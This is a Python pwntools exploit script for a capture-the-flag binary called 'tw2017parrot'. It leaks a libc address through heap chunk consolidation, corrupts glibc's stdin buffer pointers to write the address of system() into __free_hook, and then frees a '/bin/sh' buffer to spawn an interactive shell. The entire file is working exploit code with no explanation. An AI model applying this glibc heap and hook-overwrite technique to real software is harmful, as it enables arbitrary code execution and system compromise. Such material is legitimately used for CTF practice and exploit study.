#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

binary = './tw2017parrot'
elf = ELF(binary)
libc = elf.libc

io = process(binary)
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-h']

myu64 = lambda x: u64(x.ljust(8, '\0'))
ub_offset = 0x3c4b30

def malloc(sz, payload=None):
    io.recvuntil('Size:\n')
    io.sendline(str(sz))
    io.recvuntil('Buffer:')
    if payload:
        io.send(payload)
        time.sleep(0.1)

# malloc_consolidate
malloc(0x20-8, 'AAAA')
malloc(0x30-8, 'BBBB')
malloc(0x90-8, 'CCCC')

# leak libc
malloc(0x20-8, 'AAAAAAAA')
io.recvuntil('AAAAAAAA')
libc.address = u64(io.recv(8)) - 0x3c4b78
log.info("\033[33m" + hex(libc.address) + "\033[0m")

malloc(0x3c4918 + 1 + libc.address, '\n')
io.recvuntil("Size:\n")
io.send('0' * 0x16 + '1\0' + p64(libc.symbols['__free_hook']-8) + p64(libc.symbols['__free_hook']+8))

for i in range(15):
    io.recvuntil('Buffer:\n')
    io.send('\n')
    time.sleep(0.1)

io.recvuntil('Size:\n')
io.send('20\n'.ljust(8, '\0') + p64(libc.symbols['system']))
io.recvuntil('Buffer:\n')
io.send('/bin/sh\0')
io.interactive()


